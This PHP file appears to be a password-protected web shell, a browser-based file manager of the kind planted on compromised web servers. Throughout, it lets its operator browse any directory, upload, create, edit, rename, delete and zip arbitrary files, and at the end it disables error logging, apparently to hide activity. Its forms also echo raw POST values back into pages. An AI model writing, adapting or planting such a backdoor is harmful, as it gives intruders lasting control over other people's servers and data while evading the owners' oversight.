<?php
session_start();
set_time_limit(0);
$password = '$2y$10$HI5sBrenjZyy88tGWKnCwOLnHf09C5LfLcz09Qe9ZK8M4oLBqXDrO';
function login() {
	?>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<style type="text/css">
		@import url('https://fonts.googleapis.com/css2?family=Pangolin&display=swap');
		body {
			font-family: 'Pangolin', cursive;
			background: rgba(0, 0, 0, 0.3);
			color: #8a8a8a;
		}
		table {
			position: static;
			background: #fff;
			box-shadow: 0px 0px 0px 6px #fff;
			border-top: 0px solid #fff;
			border-bottom: 20px solid #fff;
			border-right: 20px solid #fff;
			border-left: 20px solid #fff;
			border-radius:3px;
			border-spacing:0;
		}
		th {
			padding:12px;
			font-size:30px;
			font-weight: bold;
		}
		td {
			border: 6px solid #000;
			padding:5px;
			border:none;
		}
		input {
			width:100%;
			padding:9px;
			background: rgba(222,222,222,0.73);
			border:rgba(222,222,222,0.73);
			outline:none;
			border-radius:4px;
		}
		@media (min-width: 320px) and (max-width: 480px) {
			table {
				width:100%;
			}
		}
	</style>
	<br><br><br><br><br><br><br><br><br><br><br><br><br><br>
	<form method="post">
		<table align="center" width="20%">
			<tr>
				<thead>
					<th>LOGIN</th>
				</thead>
			</tr>
			<tr><thead><th></th></thead></tr>
			<tbody>
				<tr>
					<td>
						<input type="password" name="password">
					</td>
				</tr>
			</tbody>
		</table>
	</form>
	<?php
	exit();
}
function logout() {
	unset($_SESSION['login']);
	?> <script>window.location='http://<?= $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'] ?>'</script> <?php
}
if (!isset($_SESSION['login'])) {
	if (empty($password) || (isset($_POST['password']) && (password_verify($_POST['password'], $password)))) {
		$_SESSION['login'] = true;
	} else {
		login();
	}
}
?>
<title><?= get_current_user() ?></title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style type="text/css">
	@import url('https://fonts.googleapis.com/css2?family=Pangolin&display=swap');
	body {
		font-family: 'Pangolin', cursive;
		background: rgba(0, 0, 0, 0.3);
		color: #8a8a8a;
	}
	table {
		background: #fff;
		box-shadow: 0px 0px 0px 6px #fff;
		border-top: 0px solid #fff;
		border-bottom: 20px solid #fff;
		border-right: 20px solid #fff;
		border-left: 20px solid #fff;
		border-radius:5px;
		border-spacing:0;
	}
	th {
		padding:12px;
		font-weight: normal;
	}
	td {
		border: 6px solid #000;
		padding:5px;
		border:none;
	}
	td.no-border {
		border:none;
	}
	button {
		color: #8a8a8a;
		font-family: 'Pangolin', cursive;
		background:none;
		border:none;
	}
	button:focus {
		outline:none;
	}
	select:focus, 
	input:focus,
	textarea:focus {
		outline:none;
	}
	button:hover {
		cursor:pointer;
	}
	textarea {
		font-family: 'Pangolin', cursive;
		width:100%;
		color: #8a8a8a;
		height:350px;
		resize:none;
		border:1px solid rgba(222,222,222,0.73);
		border-radius:5px;
	}
	select {
		color: #8a8a8a;
		font-family: 'Pangolin', cursive;
		content: "";
		padding:4px;
		background: #fff;
		border-top: none;
		border-left: none;
		border-right: none;
		border-bottom: none;
	}
	input[type=text] {
		width:100%;
		color: #8a8a8a;
		font-family: 'Pangolin', cursive;
		padding:10px;
		background: #fff;
		border-radius:5px;
		border:1px solid rgba(222,222,222,0.73);
	}
	input[type=submit] {
		width:100%;
		color: #8a8a8a;
		font-family: 'Pangolin', cursive;
		content: "";
		padding:10px;
		background: rgba(222,222,222,0.73);
		border-radius:10px;
		border:1px solid rgba(222,222,222,0.73);
	}
	input[type=submit]:focus {
		border:5px solid #ff9696;
		background: #ff9696;
		color:#fff;
	}
	input[type=submit]:hover {
		cursor: pointer;
		border:1px solid #ff9696;
	}
	input[type=text]:hover {
		border:1px solid #ff9696;
	}
	textarea:hover {
		border:1px solid #ff9696;
	}
	span.action {
		font-size:25px;
		font-weight:bold;
	}
	.icon {
		width:25px;
		height:25px;
	}
	td.icon {
		width:10px;
	}
	td.action {
		max-width:100px;
	}
	::-moz-selection {
		color: #fff;
		background: #ffadad;
	}
	::selection {
		color: #fff;
		background: #ffadad;
	}
	button.tools {
		padding:10px;
		width:120px;
		border-radius:15px;
		background: rgba(222,222,222,0.73);
	}
	.upload-btn-wrapper {
  		position: relative;
  		overflow: hidden;
  		display: inline-block;
  		margin-top:12px;
	}
	.btn {
  		color: #8a8a8a;
  		border:5px solid rgba(222,222,222,0.73);
  		padding: 6px 22px;
  		border-radius: 7px;
  		font-size: 15px;
	}
	.upload-btn-wrapper input[type=file] {
  		font-size: 100px;
  		position: absolute;
  		left: 0;
  		top: 0;
  		opacity: 0;
	}
	select.action {
		float: right;
	}
	td.act {
		width:100px;
	}
	#modalContainer {
		background-color:rgba(0, 0, 0, 0.3);
		position:absolute;
		width:100%;
		height:100%;
		top:0px;
		left:0px;
		z-index:10000;
	}

	#alertBox {
		position:relative;
		width:300px;
		min-height:165px;
		padding:10px;
		border-radius:10px;
		margin-top:50px;
		background-color:#fff;
		background-repeat:no-repeat;
		background-position:20px 30px;
	}

	#modalContainer > #alertBox {
		position:fixed;
	}

	#alertBox h1 {
		margin:0;
		font-family: 'Ubuntu Mono', monospace;
		color:#000;
		border-bottom: 1px solid rgba(222,222,222,0.73);
		border-radius: 10px 10px 00px 0px;
		padding:10px 0 10px 15px;
	}

	#alertBox p {
		font-family: 'Ubuntu Mono', monospace;
		height:50px;
		margin-left:16px;
	}

	#alertBox #closeBtn {
		display:block;
		position:relative;
		margin:5px auto;
		outline:none;
		padding:7px 100px;
		border-radius:7px;
		width:70px;
		font-family: 'Pangolin', cursive;
		text-transform:uppercase;
		text-align:center;
		color: #8a8a8a;
		background-color:rgba(222,222,222,0.73);
		text-decoration:none;
	}
	.container {
  		display: block;
  		position: relative;
  		padding-left: 15px;
  		margin-bottom: 25px;
  		cursor: pointer;
  		-webkit-user-select: none;
  		-moz-user-select: none;
  		-ms-user-select: none;
  		user-select: none;
	}

	.container input {
  		position: absolute;
  		opacity: 0;
  		cursor: pointer;
  		height: 0;
  		width: 0;
	}

	.checkmark {
  		position: absolute;
  		top: 0;
  		left: 0;
  		height: 18px;
  		width: 18px;
  		border-radius:10px;
  		background-color: rgba(222,222,222,0.73);
	}
	.container:hover input ~ .checkmark {
  		background-color: #ccc;
	}
	.container input:checked ~ .checkmark {
  		background-color: #2196F3;
	}
	.checkmark:after {
  		content: "";
  		position: absolute;
  		display: none;
	}
	.container input:checked ~ .checkmark:after {
  		display: block;
	}
	.container .checkmark:after {
  		left: 6px;
  		top: 2px;
  		width: 3px;
  		height: 8px;
  		border: solid white;
 		border-width: 0 3px 3px 0;
  		-webkit-transform: rotate(45deg);
  		-ms-transform: rotate(45deg);
  		transform: rotate(45deg);
	}
	/* Smartphones Mobile (Potrait) */
	@media (min-width: 320px) and (max-width: 480px) {
		body {
			background:no-repeat;
		}
		table {
			width:100%;
			border:none;
			box-shadow:none;
		}
		td.scrren {
			display:none;
		}
		td.act {
			float: right;
		}
		button.tools {
			padding:7px;
			width:100px;
		}
		select.act {
			width:100%;
		}
		.rw {
			margin-left:40px;
		}
		.br {
			margin:5px;
			margin-left:1px;
		}
	}
	/* Smartphones Mobile (Landscape) */
	@media (min-width: 481px) and (max-width: 767px) {
		body {
			background:no-repeat;
		}
		table {
			width:100%;
			border:none;
			box-shadow:none;
		}
		td.scrren {
			display:inline;
		}
		td.act {
			float: right;
		}
		button.tools {
			padding:7px;
			width:100px;
		}
		select.act {
			width:100%;
		}
	}
</style>
<script type='text/javascript'>
	var alert_TITLE = "Oops!";
	var alert_BUTTON_TEXT = "Ok";

	if(document.getElementById) {
		window.alert = function(txt) {
			createCustomalert(txt);
		}
	}
	function createCustomalert(txt) {
		d = document;
		if(d.getElementById("modalContainer")) return;
		mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
		mObj.id = "modalContainer";
		mObj.style.height = d.documentElement.scrollHeight + "px";
		alertObj = mObj.appendChild(d.createElement("div"));
		alertObj.id = "alertBox";
		if(d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
		alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth)/2 + "px";
		alertObj.style.visiblity="visible";
		h1 = alertObj.appendChild(d.createElement("h1"));
		h1.appendChild(d.createTextNode(alert_TITLE));
		msg = alertObj.appendChild(d.createElement("p"));
		msg.innerHTML = txt;
		btn = alertObj.appendChild(d.createElement("a"));
		btn.id = "closeBtn";
		btn.appendChild(d.createTextNode(alert_BUTTON_TEXT));
		btn.href = "#";
		btn.focus();
		btn.onclick = function() { removeCustomalert();return false; }
		alertObj.style.display = "block";
	}
	function removeCustomalert() {
		document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
	}
</script>
<table align="center" width="60%">
<?php
date_default_timezone_set('Asia/Jakarta');
function cwd() {
	if (isset($_POST['dir'])) {
		$cwd = $_POST['dir'];
		chdir($cwd);
	} else {
		$cwd = str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
	} return str_replace('\\\\', DIRECTORY_SEPARATOR, $cwd);
}
$file = new Files();
switch (@$_POST['action']) {
	case 'rename':
		if (isset($_POST['newname'])) {
			$rename = $file->renames($_POST['file'], $_POST['newname']);
			if ($rename) {
				print("<script>alert('rename success')</script>");
			} else {
				print("<script>alert('rename failed')</script>");
			}
		}
		switch ($_POST['file']) {
			case @filetype($_POST['file']) == 'dir' :
				?>
				<tr>
					<th colspan="4">
						<span class="action">RENAME</span>
					</th>
				</tr>
				<tr>
					<td class="no-border" style="width:100px;">
						Filename
					</td>
					<td class="no-border"><center>:</center></td>
					<td class="no-border">
						<?= $file->permission_file($_POST['file'], basename($_POST['file'])) ?>
					</td>
				</tr>
				<tr>
					<td class="no-border" style="width:100px;">
						Last Update
					</td>
					<td class="no-border"><center>:</center></td>
					<td class="no-border">
						<?= date ("F d Y H:i:s.", filemtime($_POST['file'])) ?>
					</td>
				</tr>
				<tr>
					<form method="post">
						<td class="no-border" colspan="3">
							<select onchange='if(this.value != 0) { this.form.submit(); }'>
								<option value="back">BACK</option>
								<option value="delete">DELETE</option>
								<option value="rename" selected>RENAME</option>
							</select>
							<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
							<input type="hidden" name="file" value="<?=$_POST['file']?>">
						</td>
					</form>
				</tr>
					<form method="post">
						<td class="no-border" colspan="3">
							<input type="text" name="newname" value="<?= $_POST['file'] ?>">
						</td>
						<td class="no-border" colspan="3">
							<input type="submit">
							<input type="hidden" name="action" value="rename">
							<input type="hidden" name="file" value="<?=$_POST['file']?>">
						</td>
					</form>
				</tr>
				<?php
				break;
			
			case @filetype($_POST['file']) == 'file' :
				?>
				<tr>
					<th colspan="4">
						<span class="action">RENAME</span>
					</th>
				</tr>
				<tr>
					<td class="no-border" style="width:100px;">
						Filename
					</td>
					<td class="no-border"><center>:</center></td>
					<td class="no-border">
						<?= $file->permission_file($_POST['file'], basename($_POST['file'])) ?>
					</td>
				</tr>
				<tr>
					<td class="no-border" style="width:100px;">
						Last Update
					</td>
					<td class="no-border"><center>:</center></td>
					<td class="no-border">
						<?= date ("F d Y H:i:s.", filemtime($_POST['file'])) ?>
					</td>
				</tr>
				<tr>
					<form method="post">
						<td class="no-border" colspan="3">
							<select onchange='if(this.value != 0) { this.form.submit(); }'>
								<option value="back"><span>BACK</option>
								<option value="edit"><span>EDIT</option>
								<option value="delete"><span>DELETE</option>
								<option value="rename" selected>RENAME</option>
							</select>
							<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
							<input type="hidden" name="file" value="<?=$_POST['file']?>">
						</td>
					</form>
				</tr>
					<form method="post">
						<td class="no-border" colspan="3">
							<input type="text" name="newname" value="<?= $_POST['file'] ?>">
						</td>
						<td class="no-border" colspan="3">
							<input type="submit" name="submit">
							<input type="hidden" name="action" value="rename">
							<input type="hidden" name="file" value="<?=$_POST['file']?>">
						</td>
					</form>
				</tr>
				<?php
				break;
		}
		exit();
		break;
	case 'edit':
		?>
		<tr>
			<th colspan="3">
				<span class="action">EDIT</span>
			</th>
		</tr>
		<?php
		if (isset($_POST['submit'])) {
			$edit = $file->edit($_POST['file'], $_POST['text']);
			if ($edit) {
				print("<script>alert('edit failed')</script>");
			} else {
				print("<script>alert('edit success')</script>");
			}
		}
		?>
		<tr>
			<td class="no-border" style="width:100px;">
				Filename
			</td>
			<td class="no-border"><center>:</center></td>
			<td class="no-border">
				<?= $file->permission_file($_POST['file'], basename($_POST['file'])) ?>
			</td>
		</tr>
		<tr>
			<td class="no-border" style="width:100px;">
				Last Update
			</td>
			<td class="no-border"><center>:</center></td>
			<td class="no-border">
				<?= date ("F d Y H:i:s.", filemtime($_POST['file'])) ?>
			</td>
		</tr>
		<tr>
			<form method="post">
				<td colspan="2">
					<button style="float: left;" name="dir" value="<?= str_replace(basename($_POST['file']), '', $_POST['file']) ?>">
						<img src="https://image.flaticon.com/icons/svg/271/271218.svg" class="icon">
					</button>
				</td>
			</form>
			<form method="post">
				<td class="no-border">
					<select style="width:100%;" onchange='if(this.value != 0) { this.form.submit(); }'>
						<option value="back">BACK</option>
						<option value="edit"selected>EDIT</option>
						<option value="delete">DELETE</option>
						<option value="rename">RENAME</option>
					</select>
					<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
					<input type="hidden" name="file" value="<?=$_POST['file']?>">
				</td>
			</form>
		</tr>
		<tr>
			<form method="post">
				<td class="no-border" colspan="3">
					<textarea name="text"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
				</td>
		</tr>
		<tr>
			<td class="no-border" colspan="3">
				<input type="submit" name="submit" value="EDIT">
				<input type="hidden" name="action" value="edit">
				<input type="hidden" name="file" value="<?=$_POST['file']?>">
			</td>
		</tr>
		</form>
		<?php
		exit();
		break;
	case 'delete':
		if ($file->delete($_POST['file'])) {
			if (isset($_POST['dirs'])) {
				chdir(str_replace(basename($_POST['file']), '', $_POST['file']));
			}
		} else {
			print("<script>alert('delete failed')</script>");
		}
		?>
		<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
		<?php
		break;
	case 'back':
		if (isset($_POST['dirs'])) {
			chdir(str_replace(basename($_POST['file']), '', $_POST['file']));
		}
		?>
		<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
		<?php
		break;
	case 'upload':
		?>
		<tr>
			<th colspan="2">
				<span class="action">UPLOAD FILE</span>
			</th>
		</tr>
		<tr>
			<td>
				<form method="post" enctype="multipart/form-data">
					<input type="hidden" name="destination" value="<?= str_replace(basename($_POST['destination']), '', $_POST['destination']) ?>">
					<div class="upload-btn-wrapper">
						<button class="btn">Choose file</button>
						<input type="file" name="file[]" multiple>
					</div>
				</td>
			<td>
					<input type="submit" name="submit" value="UPLOAD">
					<input type="hidden" name="action" value="upload">
				</form>
			</td>
		</tr>
		<?php
		if (isset($_POST['submit'])) {
			$file = count($_FILES['file']['tmp_name']);
			for ($i=0; $i < $file ; $i++) { 
				if (copy($_FILES['file']['tmp_name'][$i], $_POST['destination'].DIRECTORY_SEPARATOR.$_FILES['file']['name'][$i])) {
					print("<script>alert('Uploaded  success')</script>");
				} else {
					print("<script>alert('Upload failed')</script>");
				}
			}
		}
		exit();
		break;
	case 'making':
		?>
		<tr>
			<th>
				<span style="font-weight:bold;font-size:25px;">CREATE FILE & DIRECTORY</span>
			</th>
		</tr>
		<form method="post">
			<tr>
				<td>
					<center>
						<input type="radio" name="type" value="file"> FILE
						<input type="radio" name="type" value="dir"> DIR
					</center>
				</td>
			</tr>
			<tr>
				<td>
					<input type="text" name="filename" placeholder="file or dir">
				</td>
			</tr>
			<tr>
				<td>
					<textarea name="text" placeholder="if you choose DIR please empty this"></textarea>
				</td>
			</tr>
			<tr>
				<td>
					<input type="submit" name="submit">
					<input type="hidden" name="action" value="making">
					<input type="hidden" name="destination" value="<?= str_replace(basename($_POST['destination']), '', $_POST['destination']) ?>">
				</td>
			</tr>
		</form>
		<?php
		if (isset($_POST['submit'])) {
			switch ($_POST['type']) {
				case 'file':
					if ($file->making($_POST['destination'].DIRECTORY_SEPARATOR.$_POST['filename'], $_POST['text'], "file")) {
						print("<script>alert('making file <u>".$_POST['filename']."</u> failed')</script>");
					} else {
						print("<script>alert('making file <u>".$_POST['filename']."</u> success')</script>");
					}
					break;
				
				case 'dir':
					if ($file->making($_POST['destination'].DIRECTORY_SEPARATOR.$_POST['filename'], '', "dir")) {
						print("<script>alert('making dir <u>".$_POST['filename']."</u> failed')</script>");
					} else {
						print("<script>alert('making dir <u>".$_POST['filename']."</u> success')</script>");
					}
					break;
			}
		}
		exit();
		break;
	case 'backup':
		$file->backup($_POST['file']);
		break;
	case 'logout':
		logout();
		break;
}
?>
<tr>
	<form method="post">
		<th colspan="6">
			<center>
				<?php
				foreach (scandir(cwd()) as $value) {
					if (is_dir($value) || $value === '.' || $value === '..') continue;
					?> <button style="float: left;" name="dir" value="<?= dirname(cwd()) ?>">
							<img src="https://image.flaticon.com/icons/svg/271/271218.svg" class="icon">
					   </button>
					   <button class="tools" name="action" value="upload">UPLOAD</button>
					   <button class="tools" name="action" value="making">MAKING FILES</button>
					   <button class="tools rw" name="" value="">REWRITE</button>
					   <button class="tools br" name="action" value="logout">LOGOUT</button>
					   <input type="hidden" name="destination" value="<?= cwd().DIRECTORY_SEPARATOR.$value ?>"><?php
					if ($value = 1) {
						break;
					}
				}
				?>
				
			</center>
		</th>
	</form>
</tr>
<?php
$iterator = new DirectoryIterator(cwd());
foreach ($iterator as $dir) {
	if ($dir->isDir() && $dir != '.' && $dir != '..') {
		?>
		<tr>
			<td>
				<label class='container'>
				<input type="checkbox" form="my_form" name="data[]" value="<?= $dir->getPathname() ?>">
				<span class='checkmark'></span>
				</label>
			</td>
			<td class="icon">
				<img src="https://image.flaticon.com/icons/svg/716/716784.svg" class="icon">
			</td>
			<form method="post">
			<td>
				<button name="dir" value="<?=cwd().DIRECTORY_SEPARATOR.$dir->getFilename()?>">
					<?= basename($dir->getPathname()) ?>
				</button>
			</td>
			</form>
			<td class="scrren act">
				<center>
					<?= @$dir->getType() ?>
				</center>
			</td>
			<td class="scrren act">
				<center>
					<?= $file->permission($dir) ?>
				</center>
			</td>
			<form method="post">
				<td class="action act">
					<select class="action" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
						<option selected>CHOOSE</option>
						<option value="delete">DELETE</option>
						<option value="rename">RENAME</option>
					</select>
					<input type="hidden" name="file" value="<?= $dir->getPathname() ?>">
					<input type="hidden" name="dirs" value="<?= cwd() ?>">
				</td>
			</form>
		</tr>
		<?php
	}
}
foreach ($iterator as $files) {
	if ($files->isFile()) {
		?>
		<tr>
			<td style="width:1%;">
				<label class='container'>
				<input type="checkbox" form="my_form" name="data[]" value="<?= $files->getPathname() ?>">
				<span class='checkmark'></span>
				</label>
			</td>
			<td class="icon">
				<?= $file->img($files->getPathname()) ?>
			</td>
			<td>
				<a href="http://<?=str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['HTTP_HOST'], cwd()).DIRECTORY_SEPARATOR.basename($files->getPathname())?>" target='_blank'>
					<button><?=basename($files->getPathname())?></button>
				</a>
			</td>
			<td class="scrren">
				<center>
					<?=$file->size($files)?>
				</center>
			</td>
			<td class="scrren">
				<center>
					<?= $file->permission($files) ?>
				</center>
			</td>
			<form method="post">
				<td class="act">
					<?php
					$exttension = strtolower(pathinfo($files->getPathname(), PATHINFO_EXTENSION));
					switch ($exttension) {
						case 'zip':
							?>
							<select class="action" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
								<option selected>CHOOSE</option>
								<option value="extract">UNZIP</option>
								<option value="delete">DELETE</option>
								<option value="rename">RENAME</option>
							</select>
							<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
							<input type="hidden" name="dirs" value="<?= cwd() ?>">
							<?php
							break;
						case 'png':
						case 'jpg':
						case 'jpeg':
						case 'gif':
						case 'bmp':
						case 'ico':
							?>
							<select class="action" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
								<option selected>CHOOSE</option>
								<option value="delete">DELETE</option>
								<option value="rename">RENAME</option>
							</select>
							<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
							<input type="hidden" name="dirs" value="<?= cwd() ?>">
							<?php
							break;
						
						default:
							?>
							<select class="action" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
								<option selected>CHOOSE</option>
								<option value="edit">EDIT</option>
								<option value="delete">DELETE</option>
								<option value="rename">RENAME</option>
								<option value="backup">BACKUP</option>
							</select>
							<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
							<input type="hidden" name="dirs" value="<?= cwd() ?>">
							<?php
							break;
					}
					?>
				</td>
			</form>
		</tr>
		<?php
	}
}
class Files {
	public $path;
    public $options;
    public $filesystem;
    public $directories;
    public $files;
    public $text;

    function pwd() {
    	$dir = explode(DIRECTORY_SEPARATOR, cwd());
    	foreach ($dir as $key => $pwd) {
    		print("<button name='dir' value='");
    		for ($i=0; $i <= $key ; $i++) { 
    			print($dir[$i]);
    			if ($i != $key) {
    				print(DIRECTORY_SEPARATOR);
    			}
    		} print("'>{$pwd}</button><button>/</button>");
    	}
    }

    function permission_file($filename, $perms) {
    	if (is_writable($filename)) {
    		?> <font color="green"><?= $perms ?></font> <?php
    	} else {
    		?> <font color="red"><?= $perms ?></font> <?php
    	}
    }

    function permission($filename) {
    	if (is_writable($filename)) {
    		?> <font color="green">writable</font> <?php
    	} else {
    		?> <font color="red">not writable</font> <?php
    	}
    }

    function size($file) {
    	$this->discovery($file);

    	if (is_file($file)) {
    		$filePath = $file;
            if (!realpath($filePath)) {
              $filePath = $_SERVER["DOCUMENT_ROOT"].$filePath;
            }
            $fileSize = filesize($filePath);
            $sizes = array("TB","GB","MB","KB","Byte");
            $total = count($sizes);
            while ($total-- && $fileSize > 1024) {
            	$fileSize /= 1024;
            } return round($fileSize, 2)." ".$sizes[$total];
        } return false;
    }

    function img($filename) {
    	print("<img class='icon' src='");
    	$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    	switch ($ext) {
    		case 'php':
    		case 'php1':
    		case 'php2':
    		case 'php3':
    		case 'php4':
    		case 'php5':
    		case 'php6':
    		case 'phtml':
    			print("https://image.flaticon.com/icons/png/128/337/337947.png");
    			break;
    		case 'html':
    			print("https://image.flaticon.com/icons/png/128/136/136528.png");
    			break;
    		case 'pdf':
    			print("https://image.flaticon.com/icons/png/128/136/136522.png");
    			break;
    		case 'css':
    			print("https://image.flaticon.com/icons/png/128/136/136527.png");
    			break;
    		case 'ico':
    			print("https://image.flaticon.com/icons/png/128/1126/1126873.png");
    			break;
    		case 'png':
    			print("https://image.flaticon.com/icons/png/128/136/136523.png");
    			break;
    		case 'txt':
    			print("https://image.flaticon.com/icons/png/128/136/136538.png");
    			break;
    		default:
    			print("https://image.flaticon.com/icons/svg/833/833524.svg");
    			break;
    	} print("'></img>");
    }

    function unzip($source, $destination) {
    	$zip = new ZipArchive();
    	if ($zip->open($source) === true) {
    		$zip->extractTo($destination);
    		$zip->close();
    	}
	}

	function zip($source, $destination) {
		if (extension_loaded('zip')) {
			if (file_exists($source)) {
				$zip = new ZipArchive();
				if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
					if (is_dir($source)) {
						$iterator = new RecursiveDirectoryIterator($source);
						// skip dot files while iterating 
						$iterator->setFlags(RecursiveDirectoryIterator::SKIP_DOTS);
						$files = new RecursiveIteratorIterator($iterator, RecursiveIteratorIterator::SELF_FIRST);
						foreach ($files as $file) {
							$root = $_SERVER['DOCUMENT_ROOT'];
							if (is_dir($file)) {
								$zip->addEmptyDir(str_replace($root, '', $file . '/'));
							} else if (is_file($file)) {
								$zip->addFromString(str_replace($root, '',  $file), file_get_contents($file));
							}
						}
					} else if (is_file($source)) {
						$zip->addFromString(basename($source), file_get_contents($source));
					}
				}
				return $zip->close();
			}
		}
		return false;
	}

	function making($filename, $text, $name = null) {
		if ($name === 'file') {
			$handle = fopen($filename, 'w');
			fwrite($handle, $text);
			fclose($handle);
		} elseif ($name === 'dir') {
			return (!mkdir($filename, 0777) && !is_dir($filename));
		}
	}

	function delete($path) {
		if (file_exists($path)) {
		} else {
			return;
		}

		$this->discovery($path);
		if (count($this->files) > 0) {
			foreach ($this->files as $file) {
				unlink($file);
			}
		}
		if (count($this->directories) > 0) {
			arsort($this->directories);

			foreach ($this->directories as $directory) {
				if (basename($directory) == '.' || basename($directory) == '..') {
				} else {
					rmdir($directory);
				}
			}
		} return;
	}

	function edit($path, $text)  {
    	$this->discovery($path);

    	if (is_file($path)) {
    		$handle = fopen($path, "w");
    		fwrite($handle, $text);
    		fclose($handle);
    		return false;
    	} else {
    		return false;
    	}
    }

    function backup($file) {
    	$this->discovery($file);

    	$handle = fopen($file.".bak", "w");
    	fwrite($handle, file_get_contents($file));
    	fclose($handle);
    }

    function renames($filename, $newname) {
    	$this->discovery($filename);
    	return rename($filename, $newname);
    }

	function discovery($path) {
        $this->directories = array();
        $this->files       = array();

        if (is_file($path)) {
            $this->files[] = $path;
            return;
        }

        if (is_dir($path)) {
        } else {
            return;
        }

        $this->directories[] = $path;
        $objects = new RecursiveIteratorIterator (
            new RecursiveDirectoryIterator($path),
            RecursiveIteratorIterator::SELF_FIRST);

        foreach ($objects as $name => $object) {
            if (is_file($name)) {
                $this->files[] = $name;
            } elseif (is_dir($name)) {
                if (basename($name) == '.' || basename($name) == '..') {
                } else {
                    $this->directories[] = $name;
                }
            }
        } return;
    }
}
?>
<tr>
	<form method="post" id="my_form">
	<td class="no-border">
		<label class='container'>
			<input type="checkbox" onclick="checkAll(this)">
			<span class='checkmark'></span>
		</label>
	</td>
	<td class="no-border">All</td>
	<td class="no-border" colspan="4">
		<select name="mode" style="width:100%;" onchange='if(this.value != 0) { this.form.submit(); }'>
			<option selected>CHOOSE</option>
			<option value="1">DELETE</option>
			<option value="backup">BACKUP</option>
			<option value="download">DOWNLOAD</option>
			<option value="2">COMPRESS TO ZIP</option>
		</select>
	</td>
	</form>
</tr>
<?php
if (!empty($data = @$_POST['data'])) {
	foreach ($data as $filename) {
		switch ($_POST['mode']) {
			case '1':
				if ($file->delete($filename)) {
					print("<script>alert('failed')</script>");
				} else {
					if (isset($_POST['dirs'])) {
						chdir(str_replace(basename($filename), '', $filename));
					}
					?> <input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>"> <?php
				}
			break;
			case '2':
				?> <input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>"><?php
				if ($file->zip(basename($filename), str_replace(basename($filename), '', $filename)."/backup.zip")) {
					print("<script>alert('success zip')</script>");
				} else {
					print("<script>alert('failed zip')</script>");
				}
				break;
			case 'backup':
				if ($file->backup($filename)) {
					print("<script>alert('failed')</script>");
				} else {
					print("<script>alert('success backup')</script>");
				}
				break;
		}
	}
}
?>
<script type="text/javascript">
	function checkAll(ele) {
		var checkboxes = document.getElementsByTagName('input');
		if (ele.checked) {
			for (var i = 0; i < checkboxes.length; i++) {
				if (checkboxes[i].type == 'checkbox' ) {
					checkboxes[i].checked = true;
				}
           	}
       	} else {
           	for (var i = 0; i < checkboxes.length; i++) {
               	if (checkboxes[i].type == 'checkbox') {
                   	checkboxes[i].checked = false;
               	}
           	}
       	}
   	}
</script>
</table>
<?php
if(function_exists('ini_set')) {
	ini_set("upload_max_filesize","300M");
    ini_set('error_log',NULL);
    ini_set('log_errors',0);
    ini_set('file_uploads',1);
    ini_set('allow_url_fopen',1);
}else{
    ini_alter('error_log',NULL);
    ini_alter('log_errors',0);
    ini_alter('file_uploads',1);
    ini_alter('allow_url_fopen',1);
}
